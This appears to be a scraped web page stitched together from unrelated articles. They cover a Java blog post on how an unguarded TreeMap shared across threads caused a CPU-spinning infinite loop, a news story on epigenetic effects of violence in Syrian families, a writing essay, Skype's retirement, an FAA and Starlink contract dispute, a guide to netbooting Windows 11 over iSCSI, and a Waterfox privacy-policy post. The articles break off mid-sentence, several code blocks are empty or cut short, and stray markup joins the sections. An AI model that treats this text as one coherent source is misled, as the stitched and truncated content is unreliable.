      <article role="main">
        <p>A while back my machine was so messed up that I could barely ssh onto it.
3,200% CPU utilization - all 32 cores on the host were fully utilized!
<a href="https://josephmate.github.io/2021-10-03-my-bug-used-up-100cpu-or-did-it/">Compare that to my last bug where it only used 1 core, 100%</a></p>

<p>Fortunately, it was using Java 17 runtime which had thread dumps with CPU time!
Sorting by CPU time brought a bunch of threads that looked similar to this:</p>

<div><pre><code>"Thread-0" #22 [14700] prio=5 os_prio=0 cpu=10359.38ms elapsed=11.49s tid=0x000001cdc35aaf60 nid=14700 runnable  [0x00000047cfffe000]
   java.lang.Thread.State: RUNNABLE
	at java.util.TreeMap.put(java.base@17.0.1/TreeMap.java:826)
	at java.util.TreeMap.put(java.base@17.0.1/TreeMap.java:534)
	at BusinessLogic.someFunction(BusinessLogic.java:29)
    ...
</code></pre></div>

<p>I make a quick conclusion about this and thought to look at BusinessLogic:29 based
on the stack trace and it looked like this:</p>

<div><pre><code><span>public</span> <span>void</span> <span>someFunction</span><span>(</span><span>SomeType</span> <span>relatedObject</span><span>,</span> <span>List</span><span>&lt;</span><span>SomeOtherType</span><span>&gt;</span> <span>unrelatedObjects</span><span>)</span> <span>{</span>
  <span>...</span>
  <span>for</span> <span>(</span><span>SomeOtherType</span> <span>unrelatedObject</span> <span>:</span> <span>unrelatedObjects</span><span>)</span> <span>{</span>
    <span>treeMap</span><span>.</span><span>put</span><span>(</span><span>relatedObject</span><span>.</span><span>a</span><span>(),</span> <span>relatedObject</span><span>.</span><span>b</span><span>());</span> <span>// line 29</span>
  <span>}</span>
  <span>...</span>
<span>}</span>
</code></pre></div>

<p>That code is odd.
Notice we’re iterating over <code>unrelatedObject</code>, but the body of the loop only used <code>relatedObject</code>.
The code can be reduced to simply:</p>
<div><pre><code><span>public</span> <span>void</span> <span>someFunction</span><span>(</span><span>SomeType</span> <span>relatedObject</span><span>,</span> <span>List</span><span>&lt;</span><span>SomeOtherType</span><span>&gt;</span> <span>unrelatedObjects</span><span>)</span> <span>{</span>
  <span>...</span>
  <span>treeMap</span><span>.</span><span>put</span><span>(</span><span>relatedObject</span><span>.</span><span>a</span><span>(),</span> <span>relatedObject</span><span>.</span><span>b</span><span>());</span>
  <span>...</span>
  <span>// unrelatedObjects is used later on in the function so the parameter cannot be removed</span>
<span>}</span>
</code></pre></div>

<p>There must have been some refactoring in the area and unrelatedObject wasn’t used anymore. 
I prepared my unit test and ran the test before and after the fix.
I tried <code>treeMap</code> and <code>unrelatedObjects</code> with 1,000,000 entries, well exceeding what the application ever saw and was not able to reproduce the problem.
Assuming unrelatedObjects is size N and treeMap is size M, the complexity is O(N lg(M)).
So it makes sense that I was unable to reproduce the problem.
<a href="https://josephmate.github.io/PowersOf2/">You wouldn’t really see one minute of execution time until 100 million to 1 billion entries.</a>.</p>

<p>It must be something else.
I was certain treeMap and unrelatedObjects never exceed 1,000 entries.
It’s not even close enough to cause an issue with an O(N lg(M)) algorithm.</p>

<p>I wasn’t very familiar with the class so I started to look around,
focusing on <code>treeMap</code> and <code>unrelatedObjects</code> to see if my assumption that they
never exceed 1,000 holds. Could they be in the millions or even billions?</p>

<p>Then I noticed the definition of the TreeMap as :</p>
<div><pre><code><span>// The field wasn't actually named treeMap.</span>
<span>private</span> <span>final</span> <span>Map</span><span>&lt;</span><span>K</span><span>,</span><span>V</span><span>&gt;</span> <span>treeMap</span> <span>=</span> <span>new</span> <span>TreeMap</span><span>&lt;&gt;();</span>
</code></pre></div>

<p>That’s scary.
There were multiple threads accessing the TreeMap, and it was unguarded.
At this point, I had an aha moment.
Could an unguarded TreeMap cause 3,200% utilization?</p>

<h2 id="experiment">Experiment</h2>

<p>I put together a simple experiment to try to reproduce the problem.
I created a bunch of threads randomly updating a shared TreeMap.</p>
<div><pre><code><span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>numThreads</span><span>;</span> <span>i</span><span>++)</span> <span>{</span>
    <span>threads</span><span>.</span><span>add</span><span>(</span><span>new</span> <span>Thread</span><span>(()</span> <span>-&gt;</span> <span>{</span>
        <span>Random</span> <span>random</span> <span>=</span> <span>new</span> <span>Random</span><span>();</span>
        <span>for</span><span>(</span><span>int</span> <span>j</span> <span>=</span> <span>0</span><span>;</span> <span>j</span> <span>&lt;</span> <span>numUpdates</span><span>;</span> <span>j</span><span>++)</span> <span>{</span>
            <span>try</span> <span>{</span>
                <span>treeMap</span><span>.</span><span>put</span><span>(</span><span>random</span><span>.</span><span>nextInt</span><span>(</span><span>1000</span><span>),</span> <span>random</span><span>.</span><span>nextInt</span><span>(</span><span>1000</span><span>));</span>
            <span>}</span> <span>catch</span> <span>(</span><span>NullPointerException</span> <span>e</span><span>)</span> <span>{</span>
                <span>// let it keep going so we can reproduce the issue.</span>
            <span>}</span>
        <span>}</span>
    <span>}));</span>
<span>}</span>
</code></pre></div>

<p>That try catch was key.
If no try catch, I wasn’t able to reproduce the problem.
Some threads would crash with the above output:</p>
<div><pre><code>Exception in thread "Thread-0" java.lang.NullPointerException: Cannot read field "right" because "l" is null
        at java.base/java.util.TreeMap.rotateRight(TreeMap.java:2562)
        at java.base/java.util.TreeMap.fixAfterInsertion(TreeMap.java:2594)
        at java.base/java.util.TreeMap.addEntry(TreeMap.java:770)
        at java.base/java.util.TreeMap.put(TreeMap.java:828)
        at java.base/java.util.TreeMap.put(TreeMap.java:534)
        at SimpleRepro.lambda$main$0(SimpleRepro.java:28)
        at java.base/java.lang.Thread.run(Thread.java:833)
</code></pre></div>
<p>but the program would still halt.</p>

<p>Probably only languages that allow you to catch NPEs will encounter this issue.
Other languages will just crash.
After a few runs, I saw 500% cpu utilization.
That’s crazy!
I always thought of race conditions as corrupting the data or deadlocking.
I never though it could cause performance issues.
But it makes sense, you could corrupt the data in a way that creates an infinite loop.</p>

<p>You can check out the java experiment from my GitHub java-by-experiments repo
<a href="https://github.com/josephmate/java-by-experiments/blob/main/tree_map_corruption/java/src/main/java/SimpleRepro.java">SimpleRepro.java</a></p>

<p>To make extra sure, I created another experiment that uses reflection
against the TreeMap to dump the nodes and their colours.
(In Java, a TreeMap is implemented using a Red-Black tree.)
The cycle in the TreeMap is highlighted in blue.
<img src="https://josephmate.github.io/assets/2023-08-20_cpu_util_3200/red_black_tree_cycle.gv.svg" alt="example cycle generated from TreeMap experiment"></p>

<p>So if you’re searching or putting something not already in the map,
it could get stuck in that infinite loop.</p>

<p>To reproduce the above graph you need to use reflection to access the root, 
and the left and right fields of the <code>TreeMap.Entry</code>.
You recursively traverse the <code>TreeMap.Entry</code>s starting from root, keeping
track of the Entries you visited.
If you visit an entry you already visited, you know you’ve hit a loop.
Print all the nodes from visited to show the cycle.</p>

<h2 id="that-code-is-not-realistic">That code is not realistic</h2>

<p>Some might claim that my experimental code is unrealistic.
Who ignores NPEs?
There are two practical ways: uncaught exceptions in executors and services backed by a thread pool.</p>

<h2 id="uncaught-exceptions-in-executor">Uncaught Exceptions in Executor</h2>

<p>We could reproduce this problem in conjunction with another common mistake that suppresses uncaught exceptions.</p>

<p>When you run it, you’ll see it hang.
Take a thread dump and see the same symptoms:</p>

</code></pre></div>
<p>It’s stuck on the TreeMap and really high CPU utilization.</p>

<p>However, when looking at standard out there is nothing!
The thread pool swallowed all the NPEs not giving any indication of problem. 
Unfortunately, this was the case in my situation.</p>

<p>When managing your own thread pools, you need to make sure you:</p>
<ol>
  <li>Register an uncaught exception handler on the thread through a thread factory</li>
  <li>Operate on the futures it return. If you do <code>future.get()</code> you will get an <code>ExectionException</code> wrapping the NPE!</li>
</ol>

<h2 id="again-with-grpc">Again with gRPC</h2>

<p>Another way is to have some sort of service back by a thread pool like a gRPC service.
Here I recreate a realistic scenario in gRPC that reproduces the problem.
The service is powered by an unguarded TreeMap.</p>

<p>showing that TreeMap.put() got stuck on an infinite loop.</p>

<h2 id="how-did-it-happen-rotations">How did it happen? Rotations</h2>

<p>My suspicion is that two threads independently rotate the tree 
in opposite directions, resulting in a cycle.
Or maybe, two overlaping rotations interleave their writes in a way that produces the
cycle.
However, I do not have proof of an interleaving between threads that shows this.</p>

<p>I also suspect that the NPE is necessary.
The problem will not reproduce without hitting an NPE as I saw with my Java experiments.</p>

<p>I explore this idea that only languages with NPEs can exhibit this problem by
trying to reproduce this problem in as many languages as I’ve programmed in
before.
If this claim is true, I expect it to only reproduce in
Java, Kotlin, C#, Ruby, Typescript, and Python.
I expect to not be able to reproduce the problem in Go, C++, Rust, and Elixir.</p>

<p>From the table, the most interesting one is C++ because I was not expecting to be able to reproduce the problem due to my hypothesis from the last section.
As a result, I include the details from the experiment here. Similarly, go as unexpected, but trim the article, I left it out. You can see <a href="https://github.com/josephmate/java-by-experiments/tree/main/tree_map_corruption/golang/">Go here</a>.</p>

<p>The code is essentially the same as the Java one, only using C++ standard libraries.
I also added extra printing since I was so shocked that the problem reproduced,
I just wanted to make extra sure.</p>

<p>Occasionally, the program segfaults and crashes like before.
This is what I was expecting the worst failure to look like.</p>
<div><pre><code>./SimpleRepro
zsh: segmentation fault  ./SimpleRepro
</code></pre></div>

<p>However, very rarely the output would look like below, indicating the threads got
stuck.
After waiting 10 minutes, the threads never completed.
I did not expect this to happen because I thought it requires a thrown and
swallowed exception. That is not happening here.</p>
<div><pre><code>./SimpleRepro
Thread 0 started.Thread Thread 0: 10% complete (Thread 10/10012Thread  started.3

&lt;nothing output for 5 minutes&gt;
</code></pre></div>

<p>From the tool <code>top</code> we can see that the problem reproduced because of the high cpu
utilization.</p>
<div><pre><code>top
PID    COMMAND      %CPU  TIME     ...
59815  SimpleRepro  170.8 08:49.61 ...
</code></pre></div>

<p>This shows my claim is false.
I was able to reproduce the problem in Go and C++.
Although they sometimes segfaulted, there were times when they got stuck in the
infinite loop.
In a language like C++, when you reference a null pointer it always segfaults,
so there must be an interleaving of the threads that does not hit a null!
I have no idea why.
I was expecting them to crash given how often I saw NPEs in the Java experiment.</p>

<p>With this knowledge, I went back to my SimpeRepro java experiment and stopped catching the NPE.
After re-running it 12 times, I was still able to reproduce the problem despite not catching the NPE:</p>
<div><pre><code>"Thread-4" #17 prio=5 os_prio=31 cpu=18597.02ms elapsed=23.79s tid=0x00007f81051ac200 nid=0x6a03 runnable  [0x000070000bcb5000]

        at java.lang.Thread.run(java.base@17.0.3/Thread.java:833)
</code></pre></div>

<p>The other thing that surprised me was languages like Ruby, despite letting you
catch NPEs did not let you reproduce the problem. The Global Interpreter Lock (GIL)
somehow prevented all execution interleavings that would reproduce the problem.</p>

<h2 id="easy-fix-guard-against-concurrent-modification">Easy Fix: Guard against concurrent modification</h2>

<p>The easiest way to fix this was to wrap the TreeMap with <code>Collections.synchronizedMap</code> or switch to <code>ConcurrentHashMap</code> and sort on demand.
However, those fixes are boring and did not prevent us from making that mistake and taking down our host.</p>

<h2 id="controversial-fix-track-visited-nodes">Controversial Fix: Track visited nodes</h2>

<p>What if you could safely make the mistake, but not have a cycle?</p>

<p>I modified the red-black tree to record the nodes it has already visited.
The only requires an additional O(lg(n)) memory since it’s limited by the height of the tree.
The height of a red-black tree is guaranteed to be O(lg(n)).
If we encounter a node that we already visited, we throw a <code>ConcurrentModificationException</code>.
This will not prevent the data corruption,
but will prevent 100% cpu utilization from the infinite loop if someone makes that mistake again in the future.
This would require standard libraries to adopt this technique though which I
don’t think is likely to happen given the extra memory needed.</p>

<p>In the above code, you can see that I modified both the get and put methods to
maintain the set of visited nodes and throw a <code>ConcurrentModificationException</code>
when an already visited node is in the set.</p>

<h2 id="mistakes-happen-make-swiss-cheese">Mistakes Happen: Make Swiss Cheese</h2>

<p>Mistakes happen so it’s important that multiple layers are in place to detect the issue.
Imaging a slice of Swiss cheese, each slice taken from a different block of cheese.
Stacking enough of those slices would result in nothing being able to pass through.</p>

<h2 id="alerts-on-npes">Alerts on NPEs</h2>

<p>We lacked an alarm on any instance of an NPE.
We only had error rate alarms.
This NPE only occurs once per API handler worker thread before which was not enough to trigger our error rate alarms.
On top of that, none of the NPEs were logged because we had an unhandled exception in our Executor.</p>

<h2 id="alerts-on-utilization-anomalies">Alerts on utilization anomalies</h2>

<p>We monitor the cpu utilization and use a naive threshold based approach to alarming.
When the cpu utilization exceeds that threshold, we fire an alarm because it indicates abnormal behaviour.
This is how we discovered the issue.</p>

<p>Static code analysis tools like SpotBugs (used to be called FindBugs), JLint, and Chord can detect these kinds of issues at build time. See the paper <a href="https://www.sqrlab.ca/papers/SCAM2010.pdf">How Good is Static Analysis at Finding Concurrency Bugs?</a>.

		 <p>In 1982, the Syrian government besieged the city of Hama, killing tens of thousands of its own citizens in sectarian violence. Four decades later, <a href="https://apnews.com/article/syria-aleppo-hama-massacre-assad-799f37fd2608532a253cccb48df4e613" target="_blank" rel="noopener">rebels used the memory of the massacre</a> to help inspire the toppling of the Assad family that had overseen the operation.</p>
<p>But there is another lasting effect of the attack, hidden deep in the genes of Syrian families. The grandchildren of women who were pregnant during the siege — grandchildren who never experienced such violence themselves — nonetheless bear marks of it in their genomes. Passed down through their mothers, this genetic imprint offers the first human evidence of a phenomenon previously documented only in animals: The genetic transmission of stress across multiple generations.</p>
<p>“The idea that trauma and violence can have repercussions into future generations should help people be more empathetic, help policymakers pay more attention to the problem of violence,” said <a href="https://people.clas.ufl.edu/cmulligan/" target="_blank" rel="noopener">Connie Mulligan</a>, Ph.D., a professor of Anthropology and the Genetics Institute at the University of Florida and senior author of the new study. “It could even help explain some of the seemingly unbreakable intergenerational cycles of abuse and poverty and trauma that we see around the world, including in the U.S.”</p>
<p>While our genes are not changed by life experiences, they can be tuned through a system known as epigenetics. In response to stress or other events, our cells can add small chemical flags to genes that may quiet them down or alter their behavior. These changes may help us adapt to stressful environments, although the effects aren’t well understood.</p>
<p>It is these tell-tale chemical flags that Mulligan and her team were looking for in the genes of Syrian families. While lab experiments have shown that animals can pass along epigenetic signatures of stress to future generations, proving the same in people has been nearly impossible.&nbsp;</p>

		 <p>Mulligan worked with <a href="https://staff.hu.edu.jo/CV_e.aspx?id=0gnQeXkZsCc=" target="_blank" rel="noopener">Rana Dajani</a>, Ph.D., a molecular biologist at Hashemite University in Jordan, and anthropologist <a href="https://anthropology.yale.edu/profile/catherine-panter-brick" target="_blank" rel="noopener">Catherine Panter-Brick</a>, Ph.D., of Yale University, to conduct the unique study. The research relied on following three generations of Syrian immigrants to the country. Some families had lived through the Hama attack before fleeing to Jordan. Other families avoided Hama, but lived through the recent civil war against the Assad regime.&nbsp;</p>
<p>The team collected samples from grandmothers and mothers who were pregnant during the two conflicts, as well as from their children. This study design meant there were grandmothers, mothers and children who had each experienced violence at different stages of <img src="https://news.ufl.edu/media/newsufledu/images/2025/02/exp-design-566x437.jpg" alt="">development.</p>
<p>A third group of families had immigrated to Jordan before 1980, avoiding the decades of violence in Syria. These early immigrants served as a crucial control to compare to the families who had experienced the stress of civil war.</p>
<p>Herself the daughter of refugees, Dajani worked closely with the refugee community in Jordan to build trust and interest in participating in the story. She ultimately collected cheek swabs from 138 people across 48 families.&nbsp;</p>
<p>“The families want their story told. They want their experiences heard,” Mulligan said.</p>
<p>Back in Florida, Mulligan’s lab scanned the DNA for epigenetic modifications and looked for any relationship with the families’ experience of violence.</p>
<p>In the grandchildren of Hama survivors, the researchers discovered 14 areas in the genome that had been modified in response to the violence their grandmothers experienced. These 14 modifications demonstrate that stress-induced epigenetic changes may indeed appear in future generations, just as they can in animals.</p>
<p>The study also uncovered 21 epigenetic sites in the genomes of people who had directly experienced violence in Syria. In a third finding, the researchers reported that people exposed to violence while in their mothers’ wombs showed evidence of accelerated epigenetic aging, a type of biological aging that may be associated with susceptibility to age-related diseases.&nbsp;</p>
<p>Most of these epigenetic changes showed the same pattern after exposure to violence, suggesting a kind of common epigenetic response to stress — one that can not only affect people directly exposed to stress, but also future generations.</p>
<p>“We think our work is relevant to many forms of violence, not just refugees. Domestic violence, sexual violence, gun violence: all the different kinds of violence we have in the U.S,” said Mulligan. “We should study it. We should take it more seriously.”</p>
<p>It’s not clear what, if any, effect these epigenetic changes have in the lives of people carrying them inside their genomes. But some studies have found a link between stress-induced epigenetic changes and diseases like diabetes. <a href="https://www.nytimes.com/2018/01/31/science/dutch-famine-genes.html">One famous study</a> of Dutch survivors of famine during World War II suggested that their offspring carried epigenetic changes that increased their odds of being overweight later in life. While many of these modifications likely have no effect, it’s possible that some can affect our health, Mulligan said.</p>
<p>The researchers published their findings, which were supported by the National Science Foundation, Feb. 27 in the journal Scientific Reports.&nbsp;</p>
<p>While carefully searching for evidence of the lasting effects of war and trauma stamped into our genomes, Mulligan and her collaborators were also struck by the perseverance of the families they worked with. Their story was much bigger than merely surviving war, Mulligan said.&nbsp;</p>
<p>“In the midst of all this violence we can still celebrate their extraordinary resilience. They are living fulfilling, productive lives, having kids, carrying on traditions. They have persevered,” Mulligan said. “That resilience and perseverance is quite possibly a uniquely human trait.”</p>

<div id="readability-page-1" class="page"><div data-node="ch78d0t3zn46">
		<p>For those of us with woefully average gray matter, <a href="https://kupajo.com/eliminate-noise-in-your-mental-bandwidth/">our minds have limited reach</a>. For the past, they are enthusiastic but incompetent archivists. In the present, they reach for <a href="https://kupajo.com/beware-of-black-butterflies/">the most provocative fragments of ideas</a>, often preferring distraction over clarity.</p>
<p>Writing provides scaffolding. Structure for the unstructured, undisciplined mind. It’s a practical tool for thinking more effectively. And sometimes, it’s the best way to truly begin to think at all.</p>
<p>Let’s call your mind’s default setting ‘perpetual approximation mode.’ &nbsp;A business idea, a scrap of gossip, a trivial fact, a romantic interest, a shower argument to reconcile something long past. <a href="https://kupajo.com/grow-inherently-not-apparently/">We spend more time mentally rehearsing activities than actually doing them</a>. You can spend your entire life hopping among these shiny fragments without searching for underlying meaning until tragedy, chaos, or opportunity slaps you into awareness.</p>
<p>Writing forces you to tidy that mental clutter. To articulate things with a level of context and coherence the mind alone can’t achieve. Writing expands your working memory, lets you be more brilliant on paper than you can be in person.</p>
<p>While some of this brilliance comes from enabling us to connect larger and larger ideas, much of it comes from stopping, uh, non-brilliance. Writing reveals what you don’t know, what you can’t see when an idea is only held in your head. <a href="https://kupajo.com/fear-and-loneliness-cause-people-to-act-in-self-contradictory-ways/">Biases, blind spots, and assumptions</a> you can’t grasp internally.</p>
<p>At its best, writing (and reading) can reveal the ugly, uncomfortable, or unrealistic parts of your ideas. It can pluck out parasitic ideas burrowed so deeply that they imperceptibly steer your feelings and beliefs. Sometimes this uprooting will reveal that the lustrous potential of a new idea is a mirage, or that your understanding of someone’s motives was incomplete, maybe projected.</p>
<p>If you’re repeatedly drawn to a thought, feeling, or belief, write it out. Be fast, be sloppy. Just as children ask why, why, why, you can repeat the question “why do I think/feel/believe this?” a few times. What plops onto the paper may surprise you. So too will the headspace that clears from pouring out the canned spaghetti of unconnected thoughts.</p>

          <p>After more than 21 years, Skype will soon be no more. Last night, some users (including Ars readers) poked around in the latest Skype preview update and noticed as-yet-unsurfaced text that read "Starting in May, Skype will no longer be available. Continue your calls and chats in Teams."</p>
<p>This morning, Microsoft has confirmed to Ars that it's true. May 5, 2025, will mark the end of Skype's long run.</p>
<p>Alongside the verification that the end is nigh, Microsoft shared a bunch of details about how it plans to migrate Skype users over. Starting right away, some Skype users (those in Teams and Skype Insider) will be able to log in to Teams using their Skype credentials. More people will gain that ability over the next few days.</p>
<p>Microsoft claims that users who do this will see their existing contacts and chats from Skype in Teams from the start. Alternatively, users who don't want to do this can export their Skype data—specifically contacts, call history, and chats.</p>

The news was also <a href="https://www.bloomberg.com/news/articles/2025-02-27/faa-weighs-canceling-verizon-deal-amid-starlink-terminal-tests">confirmed by <em>Bloomberg</em></a> <a href="https://apnews.com/article/elon-musk-starlink-spacex-faa-bbe9495978cac61b60c2971168e2921f">and <em>The Associated Press</em></a>.</p><p>It’s unclear exactly how this would unfold — whether the FAA would hand some of the work to Starlink while allowing Verizon to continue its own effort or simply cancel the contract with Verizon and award it to Starlink. Whatever the outcome, it is sure to raise accusations of favoritism, cronyism, and conflicts of interest, as Musk continues to serve as <a href="https://www.theverge.com/news/619412/doge-acting-administrator-amy-gleason-named">the face of the Department of Government Efficiency-run effort</a> to slash spending and lay off federal workers, despite the structural damage that causes.</p><div><p>It is sure to raise serious accusations of favoritism and conflicts of interest</p></div><p>Musk has been sowing doubt about the Verizon system for several days, <a href="https://x.com/elonmusk/status/1894202642639061144">claiming without evidence</a> that it’s “not working and so is putting air travelers at serious risk.” Earlier today, <a href="https://x.com/elonmusk/status/1895129237478162621">he posted on X</a> that the Verizon communication system is “breaking down very rapidly” and that the “FAA assessment is single digit months to catastrophic failure, putting air traveler safety at serious risk.” He also claimed that Starlink terminals would be provided at “NO COST to the taxpayer on an emergency basis to restore air traffic control connectivity.”</p><p>This, of course, follows a pattern, in which Musk posts on X about something regarding the FAA and then seems to will it into existence. Previously, <a href="https://www.theverge.com/news/603113/faa-chief-musk-dc-plane-crash-crisis">the billionaire called for FAA administrator Michael Whitaker’s resignation</a>, after the agency fined SpaceX for failing to get approval for rocket launch changes. After his repeated comments, Whitaker resigned on the day of Donald Trump’s inauguration.</p><p>A team from SpaceX, Starlink’s parent company, has been <a href="https://www.theverge.com/news/614078/faa-air-traffic-control-spacex-elon-musk-layoff-staff-shortage">working within the FAA in recent weeks</a> to help modernize the agency’s aging technology system. US Department of Transportation Secretary Sean Duffy said they were tasked with developing “a new, better, modern and safer system.”</p><p>Several SpaceX employees now have FAA email addresses, the <em>Post </em>reports. One SpaceX employee posted a photo of the team on X, with the statement, “Working to improve the safety of the national air space system.”</p><p>The FAA was scheduled to make a decision to start paying out the Verizon contract next month. But the SpaceX team reportedly recommended it be awarded to Starlink instead, the <em>Post</em> reports, citing an unnamed source with knowledge of the plans. So far, the formal process of unwinding one contract and awarding it to another company has reportedly not been followed. Several senior FAA officials have refused to sign the contract, leading Musk’s team to seek help from a Trump appointee within the agency.</p><p>Much of Musk’s wealth comes from government largesse. <a href="https://www.washingtonpost.com/technology/interactive/2025/elon-musk-business-government-contracts-funding/">According to the <em>Post</em></a>, his companies have received approximately $38 billion in government contracts, loans, subsidies, and tax credits over the years.</p><p>There have been <a href="https://www.theverge.com/planes/617438/plane-crash-air-safety-faa-layoffs">four commercial aircraft crashes globally</a> in the last 11 weeks, as well as a handful of private plane crashes and several near misses. Meanwhile, the air traffic control system appears to be in chaos, with hundreds of employees cut. Despite air travel being safer than it has ever been before, many people are left with the perception of a global aviation system that’s coming apart at the seams.</p></div></div>]]></description>

Thanks to the amazing work of the <a href="https://www.winehq.org/">WINE</a>, <a href="https://www.codeweavers.com/">CodeWeavers</a>, and <a href="https://www.valvesoftware.com/">Valve</a> developers, it’s also where I do PC gaming. I can spin up Windows in a virtual machine for the rare times I need to use it, and even pass through a GPU if I want to do gaming.</p><p>There is one pretty big exception: playing the AAA game ████████████████ with friends. Unfortunately, the developer only allows Windows. If you attempt to run the game on Linux or they detect you’re running in a virtual machine, your device and account are permanently banned. I would prefer not to be permanently banned.</p><p>For the past several years my desktop has also had a disk dedicated to maintaining a Windows install. I’d prefer to use the space in my PC case<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> for disks for Linux. Since I already run a home NAS, and my Windows usage is infrequent, I wondered if I could offload the Windows install to my NAS instead. This lead me down the course of netbooting Windows 11 and writing up these notes on how to do a simplified “modern” version.</p><h2 id="ipxe-and-iscsi">iPXE and iSCSI</h2><p>My first task was determining how to get a computer to boot from a NAS. My experience with network block devices is with Ceph RBD, where a device is mounted into an already running operating system. For booting over an Ethernet IP network the standard is iSCSI. A great way to boot from an iSCSI disk is with <a href="https://ipxe.org/">iPXE</a>. To avoid any mistakes during this process, I removed all local drives from the system.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p><p>I didn’t want to run a TFTP server on my home network, or reconfigure DHCP to provide TFTP configuration. Even if I did, the firmware for my motherboard is designed for “<span>gamers</span>”, there’s no PXE ROM. I can enable UEFI networking and a network boot option appears in the boot menu, but no DHCP requests are made<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>. Fortunately, iPXE is available as <a href="https://boot.ipxe.org/ipxe.usb">bootable USB image</a>, which loaded and started trying to fetch configuration from the network.</p><p>Hitting <code>ctrl-b</code> as directed on screen to drop to the iPXE shell, I could verify basic functionality was working.</p><pre tabindex="0"><code>iPXE 1.21.1+ (e7585fe) -- Open Source Network Boot Firmware -- https://ipxe.org

</code></pre><p>I decided to use <a href="https://github.com/fujita/tgt">tgt</a> as the iSCSI target daemon on my NAS<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> as the configuration seemed the least complicated. In <code>/etc/tgt/targets.conf</code> I configured it with two targets: one as the block device I wanted to install Windows onto and the other being the installation ISO.</p><pre tabindex="0"><code data-lang="sgml">&lt;target iqn.2025-02.com.example:win-gaming&gt;

&lt;/target&gt;
</code></pre><p>Back on the PC, I could tell iPXE to use these iSCSI disks, then boot onto the DVD. As multiple network drives are being added, each must be given a different drive ID starting from <code>0x80</code>.</p><pre tabindex="0"><code>iPXE&gt; sanhook --drive 0x80 iscsi:nas.example.com:::1:iqn.2025-02.com.example:win-gaming

</code></pre><p>After a minute of the Windows 11 logo and a spinner, the Windows 11 setup appears. In an ideal situation, I could immediately start installing. Unfortunately, the Windows 11 DVD does not ship drivers for my network card, and the iSCSI connection information passed to the booted system from iPXE couldn’t be used. I’m a bit impressed the GUI loaded at all, instead of just crashing.</p><h2 id="chainloading-winpe">Chainloading WinPE</h2><p>To rectify this, I would need to build a <a href="https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/winpe-intro">Windows PE</a> image that included my networking drivers. WinPE is the minimal environment used when installing Windows. Fortunately, Microsoft has made this pretty easy nowadays. I downloaded and installed the <a href="https://learn.microsoft.com/en-us/windows-hardware/get-started/adk-install">Windows Assessment and Deployment Kit</a> and the Windows PE add-on. After running “Deployment and Imaging Tools Environment” as an administrator, I could make a folder containing a base WinPE image.</p><pre tabindex="0"><code>&gt; mkdir C:\winpe
&gt; copype amd64 C:\winpe\amd64
</code></pre><p>After mounting the image, I was able to slipstream the <a href="https://www.intel.com/content/www/us/en/download/727998/intel-network-adapter-driver-for-microsoft-windows-11.html">Intel drivers</a>. I searched through the inf files to find the folder that supported my network card.</p><pre tabindex="0"><code>&gt; imagex /mountrw C:\winpe\amd64\media\sources\boot.wim C:\winpe\amd64\mount
&gt; dism /image:C:\winpe\amd64\mount /add-driver /driver:C:\temp\intel\PRO1000\Winx64\W11\
&gt; imagex /unmount /commit C:\winpe\amd64\mount
</code></pre><p>This new image is what we need to boot into to install Windows. As my NAS is also running an HTTP server, I copied over the files relevant to netbooting: from “C:‍\winpe\amd64\media” I copied “boot/BCD”, “boot/boot.sdi”, and “sources/boot.wim”, preserving the folders. I also downloaded <a href="https://github.com/ipxe/wimboot/releases">wimboot</a> to the same directory.</p><p>You can use iPXE to execute a script fetched with HTTP, which I took advantage of to reduce the amount of typing I’ll need to do at the shell.

This seems to be a bug with the new version of setup, as restarting it and selecting the “Previous Version of Setup” on an earlier page used a version of the installer that worked.</p><p>The installation was spread across several restarts. Fortunately, once the installation files are copied over, nothing but the main disk image is required, reducing what I needed to type in the iPXE shell. The HTTP server could also be cleaned up at this point.</p><pre tabindex="0"><code>iPXE&gt; dhcp
iPXE&gt; sanboot iscsi:nas.example.com:::1:iqn.2025-02.com.example:win-gaming

<div id="readability-page-1" class="page"><div>   <h2 id="the-recent-policy-changes">The Recent Policy Changes</h2>
<p>As you may have read in <a href="https://blog.mozilla.org/en/products/firefox/firefox-terms-of-use/">Introducing a terms of use and updated privacy notice for Firefox</a>, there has been significant confusion and commentary surrounding Mozilla’s recent policy updates. The reaction from the tech community has been mixed, with many expressing concerns about potential privacy implications.</p>
<p>I think it’s important to highlight a clarification Mozilla later added to their announcement:</p>
<blockquote>
<p>UPDATE: We’ve seen a little confusion about the language regarding licenses, so we want to clear that up. We need a license to allow us to make some of the basic functionality of Firefox possible. Without it, we couldn’t use information typed into Firefox, for example. It does NOT give us ownership of your data or a right to use it for anything other than what is described in the Privacy Notice.</p>
</blockquote>
<h2 id="a-communication-disconnect">A Communication Disconnect</h2>
<p>This situation reveals a recurring issue in how Mozilla communicates with its user base. I believe this represents a fundamental disconnect in communication strategy. Internally at Mozilla, I’m certain there were extensive discussions, agreements, disagreements, and careful consideration about how to phrase and present these changes. The team likely developed a clear understanding of the what, where, and why behind these policy updates.</p>
<p>However, when it came time to present this information to users, Mozilla seems to have forgotten that we—the external community—were not privy to those internal discussions. Critical context, nuance, and rationale that informed their decision-making process were missing from the initial announcement. What may have seemed perfectly clear to those inside Mozilla appeared ambiguous and concerning to those of us on the outside.</p>
<h2 id="waterfoxs-approach-to-privacy-policy-stability">Waterfox’s Approach to Privacy Policy Stability</h2>
<p>For Waterfox, the policy has remained consistent and straightforward, with minimal changes over time.</p>
<p>I’ve done my best to be transparent about if and when Waterfox communicates with remote servers, giving users control over these interactions whenever possible. This philosophy reflects my belief that a browser should be predictable in its behavior and respectful of user choices regarding privacy.</p>
<h2 id="forks-different-approaches-to-user-privacy">Forks: Different Approaches to User Privacy</h2>
<p>The ecosystem includes several forks that take different approaches to user privacy and interaction. Some make more aggressive privacy choices by default, while others like Waterfox aim to balance privacy with functionality in a transparent way. These forks serve an important role in the browser ecosystem by providing options for users with specific requirements.</p>
<p>But -critically- what’s often overlooked in discussions about browser privacy is the importance of formal governance structures and accountability mechanisms. While Firefox and forks like Waterfox operate within established legal and organisational frameworks, there are numerous browser projects without any formal governance documents, legal entities, or accountability structures.</p>
